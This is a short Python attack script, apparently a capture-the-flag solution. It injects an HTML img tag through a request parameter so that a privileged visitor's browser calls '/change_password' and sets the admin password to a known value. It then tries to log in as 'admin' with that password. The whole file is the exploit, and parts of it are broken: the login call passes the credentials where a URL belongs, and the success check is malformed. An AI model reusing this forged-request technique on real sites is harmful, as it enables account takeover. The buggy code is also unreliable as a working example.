import requests
from bs4 import BeautifulSoup

host = ""

payload = {
    "param": "<img src='/change_password?pw=New123paw'/>"
}

credential = {
    "username":"admin",
    "password":"New123paw"
}

try:
    req = requests.post(host+"/flag", payload)
    soup = BeautifulSoup(req.text, 'html.parser')

    if "good" in soup.find("script"):
        session = requests.Session()
        try:
            session.post(credential)
            
        except Exception as e:
            print(e)
        
except Exception as e:
    print(e)
